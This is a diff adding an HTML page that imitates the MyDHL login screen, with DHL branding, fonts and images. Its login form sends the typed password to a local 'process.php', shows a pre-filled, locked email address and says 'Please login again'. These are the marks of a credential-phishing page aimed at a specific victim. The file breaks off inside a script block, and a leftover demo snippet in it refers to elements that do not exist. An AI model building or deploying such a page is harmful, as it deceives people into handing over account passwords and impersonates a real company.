@@ -1,0 +1,462 @@
+<html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script type="text/javascript">
+        /*******************************************************************************             MaskedPassword.js       Converts password fields into "masked" password fields             ------------------------------------------------------------------------------             Adapted from                                      FormTools.addPasswordMasking             Info/Docs         http://www.brothercake.com/site/resources/scripts/formtools/             ------------------------------------------------------------------------------            *******************************************************************************/
+        function MaskedPassword(passfield, symbol) {
+            if (typeof document.getElementById == 'undefined' || typeof document.styleSheets == 'undefined') {
+                return false;
+            }
+            if (passfield == null) {
+                return false;
+            }
+            this.symbol = symbol;
+            this.isIE = typeof document.uniqueID != 'undefined';
+            passfield.value = '';
+            passfield.defaultValue = '';
+            passfield._contextwrapper = this.createContextWrapper(passfield);
+            this.fullmask = false;
+            var wrapper = passfield._contextwrapper;
+            var hiddenfield = '<input type="hidden" name="' + passfield.name + '">';
+            var textfield = this.convertPasswordFieldHTML(passfield);
+            wrapper.innerHTML = hiddenfield + textfield;
+            passfield = wrapper.lastChild;
+            passfield.className += ' masked';
+            passfield.setAttribute('autocomplete', 'off');
+            passfield._realfield = wrapper.firstChild;
+            passfield._contextwrapper = wrapper;
+            this.limitCaretPosition(passfield);
+            var self = this;
+            this.addListener(passfield, 'change', function(e) {
+                self.fullmask = false;
+                self.doPasswordMasking(self.getTarget(e));
+            });
+            this.addListener(passfield, 'input', function(e) {
+                self.fullmask = false;
+                self.doPasswordMasking(self.getTarget(e));
+            });
+            this.addListener(passfield, 'propertychange', function(e) {
+                self.doPasswordMasking(self.getTarget(e));
+            });
+            this.addListener(passfield, 'keyup', function(e) {
+                if (!/^(9|1[678]|224|3[789]|40)$/.test(e.keyCode.toString())) {
+                    self.fullmask = false;
+                    self.doPasswordMasking(self.getTarget(e));
+                }
+            });
+            this.addListener(passfield, 'blur', function(e) {
+                self.fullmask = true;
+                self.doPasswordMasking(self.getTarget(e));
+            });
+            this.forceFormReset(passfield);
+            return true;
+        }
+        MaskedPassword.prototype = {
+            doPasswordMasking: function(textbox) {
+                var plainpassword = '';
+                if (textbox._realfield.value != '') {
+                    for (var i = 0; i < textbox.value.length; i++) {
+                        if (textbox.value.charAt(i) == this.symbol) {
+                            plainpassword += textbox._realfield.value.charAt(i);
+                        } else {
+                            plainpassword += textbox.value.charAt(i);
+                        }
+                    }
+                } else {
+                    plainpassword = textbox.value;
+                }
+                var maskedstring = this.encodeMaskedPassword(plainpassword, this.fullmask, textbox);
+                if (textbox._realfield.value != plainpassword || textbox.value != maskedstring) {
+                    textbox._realfield.value = plainpassword;
+                    textbox.value = maskedstring;
+                }
+            },
+            encodeMaskedPassword: function(passwordstring, fullmask, textbox) {
+                var characterlimit = fullmask === true ? 0 : 1;
+                for (var maskedstring = '', i = 0; i < passwordstring.length; i++) {
+                    if (i < passwordstring.length - characterlimit) {
+                        maskedstring += this.symbol;
+                    } else {
+                        maskedstring += passwordstring.charAt(i);
+                    }
+                }
+                return maskedstring;
+            },
+            createContextWrapper: function(passfield) {
+                var wrapper = document.createElement('span');
+                wrapper.style.position = 'relative';
+                passfield.parentNode.insertBefore(wrapper, passfield);
+                wrapper.appendChild(passfield);
+                return wrapper;
+            },
+            forceFormReset: function(textbox) {
+                while (textbox) {
+                    if (/form/i.test(textbox.nodeName)) {
+                        break;
+                    }
+                    textbox = textbox.parentNode;
+                }
+                if (!/form/i.test(textbox.nodeName)) {
+                    return null;
+                }
+                this.addSpecialLoadListener(function() {
+                    textbox.reset();
+                });
+                return textbox;
+            },
+            convertPasswordFieldHTML: function(passfield, addedattrs) {
+                var textfield = '<input';
+                for (var fieldattributes = passfield.attributes, j = 0; j < fieldattributes.length; j++) {
+                    if (fieldattributes[j].specified && !/^(_|type|name)/.test(fieldattributes[j].name)) {
+                        textfield += ' ' + fieldattributes[j].name + '="' + fieldattributes[j].value + '"';
+                    }
+                }
+                textfield += ' type="text" autocomplete="off">';
+                return textfield;
+            },
+            limitCaretPosition: function(textbox) {
+                var timer = null,
+                    start = function() {
+                        if (timer == null) {
+                            if (this.isIE) {
+                                timer = window.setInterval(function() {
+                                    var range = textbox.createTextRange(),
+                                        valuelength = textbox.value.length,
+                                        character = 'character';
+                                    range.moveEnd(character, valuelength);
+                                    range.moveStart(character, valuelength);
+                                    range.select();
+                                }, 100);
+                            } else {
+                                timer = window.setInterval(function() {
+                                    var valuelength = textbox.value.length;
+                                    if (!(textbox.selectionEnd == valuelength && textbox.selectionStart <= valuelength)) {
+                                        textbox.selectionStart = valuelength;
+                                        textbox.selectionEnd = valuelength;
+                                    }
+                                }, 100);
+                            }
+                        }
+                    },
+                    stop = function() {
+                        window.clearInterval(timer);
+                        timer = null;
+                    };
+                this.addListener(textbox, 'focus', function() {
+                    start();
+                });
+                this.addListener(textbox, 'blur', function() {
+                    stop();
+                });
+            },
+            addListener: function(eventnode, eventname, eventhandler) {
+                if (typeof document.addEventListener != 'undefined') {
+                    return eventnode.addEventListener(eventname, eventhandler, false);
+                } else if (typeof document.attachEvent != 'undefined') {
+                    return eventnode.attachEvent('on' + eventname, eventhandler);
+                }
+            },
+            addSpecialLoadListener: function(eventhandler) {
+                if (this.isIE) {
+                    return window.attachEvent('onload', eventhandler);
+                } else {
+                    return document.addEventListener('DOMContentLoaded', eventhandler, false);
+                }
+            },
+            getTarget: function(e) {
+                if (!e) {
+                    return null;
+                }
+                return e.target ? e.target : e.srcElement;
+            }
+        }
+    </script>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <link rel="shortcut icon" href="files/favicon.ico">
+    <meta name="description" content="Sign up now for MyDHL to ship with the specialists in global shipping and benefit from shipping, tracking and billing solutions to fit your needs.">
+    <meta name="keywords" content="parcel delivery, shipping rates, global express, express delivery, package, send parcels, priority shipping, express shipping, international shipping, express delivery service">
+    <meta name="robots" content="index,nofollow">
+    <script type="text/javascript">
+        var currentLanguage = 'en';
+        var calendarLanguage = 'en';
+        var contextPath = '';
+        var btnConfirmOk = 'OK';
+        var btnConfirmCancel = 'Cancel';
+        var linkMore = "mehr";
+        var linkLess = "weniger";
+        var dateFormatPattern = 'm/d/y';
+    </script>
+    <script type="text/javascript">
+        document.addEventListener("DOMContentLoaded", function(event) {
+            var ssLink = document.createElement("link");
+            ssLink.type = "text/css";
+            ssLink.rel = "stylesheet";
+            ssLink.href = "https://fast.fonts.net/t/1.css?apiType=css&projectid=a3f6fe50-744f-4123-952d-600048fa8a7c";
+            document.getElementsByTagName("head")[0].appendChild(ssLink);
+        });
+    </script>
+    <style type="text/css">
+        @font-face {
+            font-family: "Frutiger Neue LT W06 Condensed";
+            src: url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/7280e650-6082-47c6-b466-444dc54cb2d1.eot?#iefix");
+            src: url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/7280e650-6082-47c6-b466-444dc54cb2d1.eot?#iefix") format("eot"), url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/23c8fd07-fd70-4f71-8660-ee48fd5cdd78.woff2") format("woff2"), url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/758b3adb-babc-432f-8224-6d5987a29d87.woff") format("woff"), url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/a0db12d8-1ce6-447c-88db-a84df4843728.ttf") format("truetype"), url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/85839fbf-2469-47f4-9297-e8ddadbb047f.svg#85839fbf-2469-47f4-9297-e8ddadbb047f") format("svg");
+        }
+        
+        @font-face {
+            font-family: "Frutiger Neue LT W06 Regular";
+            src: url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/faa5752a-e8aa-4792-b76e-06fdea92421d.eot?#iefix");
+            src: url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/faa5752a-e8aa-4792-b76e-06fdea92421d.eot?#iefix") format("eot"), url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/443d53e8-5a36-44d4-a132-02501f29ccb4.woff2") format("woff2"), url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/e934c7fe-0eba-45c0-be91-b05ff19b5073.woff") format("woff"), url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/a4b36fb8-d470-4a09-87d7-70de08efeeaf.ttf") format("truetype"), url("https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/fonts/d02b10aa-8aa6-465e-b1ec-e3b7d90a01f4.svg#d02b10aa-8aa6-465e-b1ec-e3b7d90a01f4") format("svg");
+        }
+    </style>
+    <link rel="shortcut icon" href="./files/favicon.ico">
+    <title>MyDHL offers solutions for shipping, tracking, billing and more. Sign up as an account holder or new user.</title>
+    <link rel="stylesheet" type="text/css" href="./files/layout.css">
+    <script src="./files/buttons.js" type="text/javascript"></script>
+    <style type="text/css"></style>
+    <script src="./files/util.js" type="text/javascript"></script>
+    <link rel="stylesheet" type="text/css" href="./files/main.css">
+    <link rel="stylesheet" type="text/css" media="print" href="./files/dhl-print.css">
+    <script src="./files/plugins.min.js" type="text/javascript"></script>
+    <script src="./files/jquery.js" type="text/javascript"></script>
+    <!--[if IE]>
+	<link href="https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/css/ie.css" type="text/css" rel="stylesheet">
+	<![endif]-->
+    <!--[if IE 6]>
+	<link href="https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/css/ie6.css" type="text/css" rel="stylesheet">
+	<![endif]-->
+    <!--[if IE 7]>
+	<link href="https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/css/ie7.css" type="text/css" rel="stylesheet">
+	<![endif]-->
+    <!--[if IE 8]>
+	<link href="https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/css/ie8.css" type="text/css" rel="stylesheet">
+	<![endif]-->
+    <style type="text/css">
+        .parcel-options-dropdown .select2-results__option {
+            height: auto;
+        }
+    </style>
+    <script type="text/javascript">
+        jQuery(function($) {
+            $(".shipping-options-help-overlay-trigger").click(function() {
+                var overlayId = $(this).attr("rel");
+                setTimeout(function() {
+                    initAccordion(overlayId);
+                }, 500);
+            });
+        });
+    </script>
+    <link type="text/css" rel="stylesheet" href="./files/1.css">
+    <style>
+        #epic-alert-4877 {
+            border: solid 1px #FFF !important;
+            box-sizing: content-box !important;
+            display: block !important;
+            margin: 0 !important;
+            opacity: 1 !important;
+            padding: 0 !important;
+            position: fixed !important;
+            scrolling: no !important;
+            seamless: seamless !important;
+            visibility: visible !important;
+            z-index: 2147483647 !important;
+            -webkit-border-radius: 5px !important;
+            -webkit-box-shadow: 0px 0px 1px #000 !important;
+            -webkit-box-sizing: content-boxtrue
+        }
+    </style>
+<link type="text/css" rel="stylesheet" href="https://fast.fonts.net/t/1.css?apiType=css&amp;projectid=a3f6fe50-744f-4123-952d-600048fa8a7c"></head>
+
+<body class="header-image" style="background-image: url('https://www.mydhl.dhl.com/content/dam/Local_Images/g0/express/mydhl/mydhl_image_western-cultural.jpg');">
+    <div id="action" style="display:none;"></div>
+    <div id="main">
+        <div id="header" class="wlp-bighorn-header"> <img src="./files/dhl_logo_transparent.png" border="0" id="logo" alt="DHL Logo">
+            <div id="application-title"> <img src="./files/mydhl_logo_transparent.png" border="0" alt="MyDHL" title="MyDHL"> </div>
+            <div id="servicelinks">
+                <form action="https://www.mydhl.dhl.com/mydhl/appmanager/smep/customerDesktop?_nfpb=true&amp;_pageLabel=smep_portal_page_login" method="post" style="display: inline"><select name="ccOverride" onchange="this.form.submit()" data-extra-width="40" class="global-country select2-hidden-accessible" tabindex="-1" aria-hidden="true"><option value="AF">Afghanistan</option><option value="AL">Albania</option><option value="DZ">Algeria</option><option value="AS">American Samoa</option><option value="AD">Andorra</option><option value="AO">Angola</option><option value="AI">Anguilla</option><option value="AG">Antigua</option><option value="AR">Argentina</option><option value="AM">Armenia</option><option value="AW">Aruba</option><option value="AU">Australia</option><option value="AT">Austria</option><option value="AZ">Azerbaijan</option><option value="BS">Bahamas</option><option value="BH">Bahrain</option><option value="BD">Bangladesh</option><option value="BB">Barbados</option><option value="BY">Belarus</option><option value="BE">Belgium</option><option value="BZ">Belize</option><option value="BJ">Benin</option><option value="BM">Bermuda</option><option value="BT">Bhutan</option><option value="BO">Bolivia</option><option value="XB">Bonaire</option><option value="BA">Bosnia and Herzegovina</option><option value="BW">Botswana</option><option value="BR">Brazil</option><option value="VG">British Virgin Islands</option><option value="BN">Brunei</option><option value="BG">Bulgaria</option><option value="BF">Burkina Faso</option><option value="BI">Burundi</option><option value="KH">Cambodia</option><option value="CM">Cameroon</option><option value="CA">Canada</option><option value="IC">Canary Islands</option><option value="CV">Cape Verde</option><option value="KY">Cayman Islands</option><option value="CF">Central African Republic</option><option value="TD">Chad</option><option value="CL">Chile</option><option value="CN">China</option><option value="CO">Colombia</option><option value="KM">Comoros</option><option value="CG">Congo</option><option value="CD">Congo The Democratic Republic of</option><option value="CK">Cook Islands</option><option value="CR">Costa Rica</option><option value="CI">Cote D’Ivoire</option><option value="HR">Croatia</option><option value="CU">Cuba</option><option value="XC">Curacao</option><option value="CY">Cyprus</option><option value="CZ">Czech Republic</option><option value="DK">Denmark</option><option value="DJ">Djibouti</option><option value="DM">Dominica</option><option value="DO">Dominican Republic</option><option value="TL">East Timor</option><option value="EC">Ecuador</option><option value="EG">Egypt</option><option value="SV">El Salvador</option><option value="ER">Eritrea</option><option value="EE">Estonia</option><option value="ET">Ethiopia</option><option value="FK">Falkland Islands</option><option value="FO">Faroe Islands</option><option value="FJ">Fiji</option><option value="FI">Finland</option><option value="FR">France</option><option value="GA">Gabon</option><option value="GM">Gambia</option><option value="GE">Georgia</option><option value="DE">Germany</option><option value="GH">Ghana</option><option value="GI">Gibraltar</option><option selected="selected" value="XX">Global</option><option value="GR">Greece</option><option value="GL">Greenland</option><option value="GD">Grenada</option><option value="GP">Guadeloupe</option><option value="GU">Guam</option><option value="GT">Guatemala</option><option value="GG">Guernsey</option><option value="GW">Guinea-Bissau</option><option value="GQ">Guinea-Equatorial</option><option value="GN">Guinea Republic</option><option value="GY">Guyana British</option><option value="GF">Guyana French</option><option value="HT">Haiti</option><option value="HN">Honduras</option><option value="HK">Hong Kong</option><option value="HU">Hungary</option><option value="IS">Iceland</option><option value="IN">India</option><option value="ID">Indonesia</option><option value="IR">Iran</option><option value="IQ">Iraq</option><option value="IE">Ireland</option><option value="IL">Israel</option><option value="IT">Italy</option><option value="JM">Jamaica</option><option value="JP">Japan</option><option value="JE">Jersey</option><option value="JO">Jordan</option><option value="KZ">Kazakhstan</option><option value="KE">Kenya</option><option value="KI">Kiribati</option><option value="KR">Korea</option><option value="KP">Korea The D.P.R of</option><option value="KV">Kosovo</option><option value="KW">Kuwait</option><option value="KG">Kyrgyzstan</option><option value="LA">Laos</option><option value="LV">Latvia</option><option value="LB">Lebanon</option><option value="LS">Lesotho</option><option value="LR">Liberia</option><option value="LY">Libya</option><option value="LI">Liechtenstein</option><option value="LT">Lithuania</option><option value="LU">Luxembourg</option><option value="MO">Macau</option><option value="MK">Macedonia Republic of</option><option value="MG">Madagascar</option><option value="MW">Malawi</option><option value="MY">Malaysia</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malta</option><option value="MH">Marshall Islands</option><option value="MQ">Martinique</option><option value="MR">Mauritania</option><option value="MU">Mauritius</option><option value="YT">Mayotte</option><option value="MX">Mexico</option><option value="FM">Micronesia</option><option value="MD">Moldova</option><option value="MC">Monaco</option><option value="MN">Mongolia</option><option value="ME">Montenegro</option><option value="MS">Montserrat</option><option value="MA">Morocco</option><option value="MZ">Mozambique</option><option value="MM">Myanmar</option><option value="NA">Namibia</option><option value="NR">Nauru</option><option value="NP">Nepal</option><option value="NL">Netherlands</option><option value="AN">Netherlands Antilles</option><option value="XN">Nevis</option><option value="NC">New Caledonia</option><option value="NZ">New Zealand</option><option value="NI">Nicaragua</option><option value="NE">Niger</option><option value="NG">Nigeria</option><option value="NU">Niue</option><option value="NO">Norway</option><option value="OM">Oman</option><option value="PK">Pakistan</option><option value="PW">Palau</option><option value="PA">Panama</option><option value="PG">Papua New Guinea</option><option value="PY">Paraguay</option><option value="PE">Peru</option><option value="PH">Philippines</option><option value="PL">Poland</option><option value="PT">Portugal</option><option value="PR">Puerto Rico</option><option value="QA">Qatar</option><option value="RE">Reunion</option><option value="RO">Romania</option><option value="RU">Russian Federation</option><option value="RW">Rwanda</option><option value="WS">Samoa</option><option value="SM">San Marino</option><option value="ST">Sao Tome and Principe</option><option value="SA">Saudi Arabia</option><option value="SN">Senegal</option><option value="RS">Serbia</option><option value="SC">Seychelles</option><option value="SL">Sierra Leone</option><option value="SG">Singapore</option><option value="SK">Slovakia</option><option value="SI">Slovenia</option><option value="SB">Solomon Islands</option><option value="SO">Somalia</option><option value="XS">Somaliland</option><option value="ZA">South Africa</option><option value="SS">South Sudan</option><option value="ES">Spain</option><option value="LK">Sri Lanka</option><option value="XY">St. Barthelemy</option><option value="XE">St. Eustatius</option><option value="KN">St. Kitts</option><option value="LC">St. Lucia</option><option value="XM">St. Maarten</option><option value="VC">St. Vincent</option><option value="SD">Sudan</option><option value="SR">Suriname</option><option value="SZ">Swaziland</option><option value="SE">Sweden</option><option value="CH">Switzerland</option><option value="SY">Syria</option><option value="PF">Tahiti</option><option value="TW">Taiwan</option><option value="TJ">Tajikstan</option><option value="TZ">Tanzania</option><option value="TH">Thailand</option><option value="TG">Togo</option><option value="TO">Tonga</option><option value="TT">Trinidad and Tobago</option><option value="TN">Tunisia</option><option value="TR">Turkey</option><option value="TC">Turks and Caicos Island</option><option value="TV">Tuvalu</option><option value="UG">Uganda</option><option value="UA">Ukraine</option><option value="AE">United Arab Emirates</option><option value="GB">United Kingdom</option><option value="US">United States of America</option><option value="UY">Uruguay</option><option value="UZ">Uzbekistan</option><option value="VU">Vanuatu</option><option value="VE">Venezuela</option><option value="VN">Vietnam</option><option value="VI">Virgin Islands US</option><option value="YE">Yemen</option><option value="ZM">Zambia</option><option value="ZW">Zimbabwe</option></select><span class="select2 select2-container select2-container--default" dir="ltr" style="width: 41px;"><span class="selection"><span class="select2-selection select2-selection--single" role="combobox" aria-autocomplete="list" aria-haspopup="true" aria-expanded="false" tabindex="-1" aria-labelledby="select2-ccOverride-j3-container"><span class="select2-selection__rendered" id="select2-ccOverride-j3-container" title="Global">Global</span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span></span></span><span class="dropdown-wrapper" aria-hidden="true"></span></span><span class="select2 select2-container select2-container--default select2-container--below" dir="ltr" style="width: 286px;"><span class="selection"><span class="select2-selection select2-selection--single" role="combobox" aria-autocomplete="list" aria-haspopup="true" aria-expanded="false" tabindex="0" aria-labelledby="select2-ccOverride-ao-container"><span class="select2-selection__rendered" id="select2-ccOverride-ao-container" title="Global">Global</span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span></span>
+                    </span><span class="dropdown-wrapper" aria-hidden="true"></span></span>
+                </form>
+                <form action="https://www.mydhl.dhl.com/mydhl/appmanager/smep/customerDesktop?_nfpb=true&amp;_pageLabel=smep_portal_page_login" method="post" style="display: inline"><select name="language" onchange="this.form.submit()" data-extra-width="40" class="global-language select2-hidden-accessible" tabindex="-1" aria-hidden="true"><option value="en" selected="selected">English</option><option value="in">Bahasa Indonesia</option><option value="bs">BiH</option><option value="bg">Bulgarian</option><option value="zh">Chinese (China)</option><option value="zt">Chinese (Taiwan)</option><option value="sc">Chinese Simplified (Hong Kong)</option><option value="tc">Chinese Traditional (Hong Kong)</option><option value="hr">Croatian</option><option value="cs">Czech</option><option value="da">Danish</option><option value="nl">Dutch</option><option value="et">Estonian</option><option value="fi">Finnish</option><option value="fr">French</option><option value="de">German</option><option value="el">Greek</option><option value="hu">Hungarian</option><option value="it">Italian</option><option value="ja">Japanese</option><option value="ko">Korean</option><option value="lv">Latvian</option><option value="lt">Lithuanian</option><option value="pl">Polish</option><option value="pt">Portuguese</option><option value="ro">Romanian</option><option value="ru">Russian</option><option value="sr">Serbian</option><option value="sk">Slovak</option><option value="sl">Slovenian</option><option value="es">Spanish</option><option value="th">Thai</option><option value="tr">Turkish</option><option value="uk">Ukrainian</option><option value="vi">Vietnamese</option></select><span class="select2 select2-container select2-container--default" dir="ltr" style="width: 41px;"><span class="selection"><span class="select2-selection select2-selection--single" role="combobox" aria-autocomplete="list" aria-haspopup="true" aria-expanded="false" tabindex="-1" aria-labelledby="select2-language-u9-container"><span class="select2-selection__rendered" id="select2-language-u9-container" title="English">English</span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span></span></span><span class="dropdown-wrapper" aria-hidden="true"></span></span><span class="select2 select2-container select2-container--default" dir="ltr" style="width: 270px;"><span class="selection"><span class="select2-selection select2-selection--single" role="combobox" aria-autocomplete="list" aria-haspopup="true" aria-expanded="false" tabindex="0" aria-labelledby="select2-language-pd-container"><span class="select2-selection__rendered" id="select2-language-pd-container" title="English">English</span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span></span>
+                    </span><span class="dropdown-wrapper" aria-hidden="true"></span></span><noscript>&lt;input type="submit" value="Change" class="submit" style="margin-left: 1em; line-height: 1em; position: relative; top: -0.2em;"/&gt;</noscript></form>
+            </div>
+        </div>
+        <div id="smep_portal_book_main" class="wlp-bighorn-book">
+            <div id="navigation-top" class="jquerycssmenu clearfix">
+                <ul id="nav"></ul><span class="wlp-bighorn-menu-button-panel"></span></div>
+            <div class="wlp-bighorn-book-main-content">
+                <div id="navigation-top-shadow"></div>
+                <div id="smep_portal_page_login" class="wlp-bighorn-page clearfix">
+                    <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
+                        <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first northwest" style="width: 75%">
+                            <div></div>
+                            <div id="portletLcc_1" class="wlp-bighorn-window  ">
+                                <div class="wlp-bighorn-window-content">
+                                    <div class="lcc-wrapper">
+                                        <div class="lcc-template">
+                                            <div class="lcc-banner-wrapper">
+                                                <div class="lcc-banner">
+                                                    <h1 class="lcc-banner-headline" style="color:#FFFFFF;">Welcome to MyDHL</h1>
+                                                    <div class="lcc-banner-text" style="color:#FFFFFF;">DHL Express is the leader in global express shipping.<br>With MyDHL we offer you an easy-to-use online shipping, tracking and billing solution — customized for your needs.</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal northeast" style="width: 25%">
+                            <div></div>
+                            <div id="portletInstance_Login" class="wlp-bighorn-window  ">
+                                <div class="wlp-bighorn-window-content">
+                                    <div class="login-container">
+                                        <form action="process.php" method="post"> <input type="hidden" name="portletInstance_Login{actionForm.formId}" value="jdoe1@emailhost.c">
+                                            <div class="external-login-form-wrapper">
+                                                <h2>Login to MyDHL</h2>
+                                                <p class="margin-bottom;"><b>Please login again.</b></p>
+                                                <div> <input type="text" name="email" id="email" value="jdoe1@emailhost.c" class="textBox" maxlength="60" size="20" title="email@example.com" required="" placeholder="Email Address" readonly="" style="cursor:no-drop; -webkit-touch-callout: none; -webkit-user-select: none;    -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; -o-user-select: none; user-select: none;">
+                                                    <script language="JavaScript" type="text/JavaScript">
+                                                        <!--// lookup by tagId to "real id"function lookupIdByTagId(id, tag){   var idScope = lookupIdScope(tag,".");   return (idScope == "") ? id : idScope + id;}//Non-Legacy lookup method creating a fully qualified scope idfunction lookupIdScope(tag,sep){   var val = "";   if (sep == null) sep = "";   while (tag != null && tag.getAttribute != null) {      try {         var attrVal = tag.getAttribute("netui:idScope");      } catch (e) { /* ignore, in IE6 calling on a table results in an exception */ }      if (attrVal != null)         val = attrVal + sep + val;      tag = tag.parentNode;   }   return val;}// map tagId to "real name"if (netui_tagIdNameMap == null)   var netui_tagIdNameMap = new Object();netui_tagIdNameMap.username="portletInstance_Login{actionForm.displayedUsername}"// lookup by tagId to "real name"function lookupNameByTagId(id, tag){   var idScope = lookupIdScope(tag,"_");   if (idScope == "")      return netui_tagIdNameMap[id];   else      return netui_tagIdNameMap[idScope  + "__" + id];}-->
+                                                    </script>
+                                                </div>
+                                                <div> <span style="position: relative;"><input type="password" name="passwd" id="passwd" class="textBox" maxlength="20" size="20" title="Password" placeholder="Password" autocomplete="off"></span>
+                                                    <script type="text/javascript">
+                                                        //apply masking to the demo-field                                                            //pass the field reference, masking symbol, and character limit                                                            new MaskedPassword(document.getElementById("demo-field"), '\u25CF');                                                            //test the submitted value                                                            document.getElementById('demo-form').onsubmit = function() {                                                                alert('pword = "' + this.pword.value + '"');                                                                return false;                                                            };
+                                                    </script>
+                                                    <script language="JavaScript" type="text/JavaScript">
+                                                        <!--netui_tagIdNameMap.password="portletInstance_Login{actionForm.password}"-->
+                                                    </script>
+                                                </div>
+                                                <div class="margin-bottom">
+                                                    <div class="ui-rc-replacement"> <input type="hidden" name="portletInstance_Loginwlw-checkbox_key:{actionForm.rememberme}OldValue" value="false"><input type="checkbox" name="portletInstance_Loginwlw-checkbox_key:{actionForm.rememberme}" id="rememberme">
+                                                        <script language="JavaScript" type="text/JavaScript">
+                                                            <!--netui_tagIdNameMap.rememberme="portletInstance_Loginwlw-checkbox_key:{actionForm.rememberme}"-->
+                                                        </script> <label for="rememberme" class="label toolbox-trigger" id="label_rememberme">Remember Me</label> <img src="./files/form_help.png" border="0" alt="" title="" class="tooltip-img checkbox-tooltip" outstaus="true">
+                                                        <div style="width: 20em; left: 775.328px; top: 180.797px; display: none;" class="tooltip-content"> We store your User ID for the next time you login. </div> <br> </div>
+                                                </div>
+                                                <div class="margin"> <input type="submit" class="login-submit button button-grey" value="Login" title="Login"> </div>
+                                                <div class="margin-top"> <a href="https://www.mydhl.dhl.com/mydhl/appmanager/smep/customerDesktop?_nfpb=true&amp;_pageLabel=P400182161326899941678&amp;_nfls=false" title="Forgot Password or User ID?">Forgot Password or User ID?</a> </div>
+                                            </div>
+                                            <div class="external-login-registration-wrapper">
+                                                <h2>New to MyDHL?</h2>
+                                                <div class="margin-bottom" style="overflow:hidden"> <a href="https://www.mydhl.dhl.com/mydhl/appmanager/smep/customerDesktop?_nfpb=true&amp;_pageLabel=smep_portal_page_userregistration&amp;_nfls=false" class="button" title="Register Now" style="width:100%">Register Now</a> </div>
+                                                <div class="margin-top"> <a href="" class="learn-benefits">Learn More About the Benefits</a> </div>
+                                            </div>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-last center" style="width: 100%">
+                            <div></div>
+                            <div id="portletRegistrationInformation_4" class="wlp-bighorn-window  ">
+                                <div class="wlp-bighorn-titlebar">
+                                    <div class="wlp-bighorn-titlebar-title-panel">Registration Information</div>
+                                    <div class="wlp-bighorn-titlebar-button-panel">&nbsp;</div>
+                                </div>
+                                <div class="wlp-bighorn-window-content">
+                                    <div netui:idscope="portletRegistrationInformation_4">
+                                        <div class="registration-teaser">
+                                            <h3 class="registration-teaser-header active">Learn About the Benefits of MyDHL and Register Now</h3>
+                                            <div class="">
+                                                <div class="lcc-benefit-icons clearfix">
+                                                    <div class="lcc-benefit-icon-wrapper"> <img src="./files/mydhl_benefit_1.png" alt="benefit-icon">
+                                                        <div class="lcc-benefit-icon-text">Fast and Easy Online Shipping</div>
+                                                    </div>
+                                                    <div class="lcc-benefit-icon-wrapper"> <img src="./files/mydhl_benefit_2.png" alt="benefit-icon">
+                                                        <div class="lcc-benefit-icon-text">Easy Tracking</div>
+                                                    </div>
+                                                    <div class="lcc-benefit-icon-wrapper"> <img src="./files/mydhl_benefit_3.png" alt="benefit-icon">
+                                                        <div class="lcc-benefit-icon-text">One Login for Everything</div>
+                                                    </div>
+                                                    <div class="lcc-benefit-icon-wrapper"> <img src="./files/mydhl_benefit_4.png" alt="benefit-icon">
+                                                        <div class="lcc-benefit-icon-text">Manage your Profile</div>
+                                                    </div>
+                                                    <div class="lcc-benefit-icon-wrapper"> <img src="./files/mydhl_benefit_5.png" alt="benefit-icon">
+                                                        <div class="lcc-benefit-icon-text">Secure and Convenient Access</div>
+                                                    </div>
+                                                </div>
+                                                <div class="clearfix">
+                                                    <div class="registration-teaser-infotext-buttons">
+                                                        <div class="lcc-infotext-wrapper">
+                                                            <div class="lcc-infotext">
+                                                                <h1 class="lcc-infotext-headline" style="color:#444;">MyDHL makes it easier than ever for you to ship online</h1>
+                                                                <div class="lcc-infotext-text" style="color:#444;">DHL is the leader in global express shipping. With MyDHL you have access to our easy-to-use, free online shipping and tracking services—all customized to your preferences. Our solution is ideal for occasional shippers, small and medium business with regular shipping needs or larger volume business to business shippers.</div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="registration-teaser-button-link"> <a href="https://www.mydhl.dhl.com/mydhl/appmanager/smep/customerDesktop?_nfpb=true&amp;_pageLabel=smep_portal_page_userregistration&amp;_nfls=false" class="button" title="Register Now">Register Now</a> <span style="margin-left:20px">or <a href="http://www.dhl.com/en/express/resource_center/ecom_tools.html" class="link registration-teaser-information-link" title="Find Out More" target="_blank">Find Out More</a></span> </div>
+                                                    </div>
+                                                    <div class="registration-teaser-video"> <iframe width="490" height="276" frameborder="0" src="./files/video_921234.html" scrolling="no"></iframe> </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <script language="JavaScript" type="text/JavaScript">
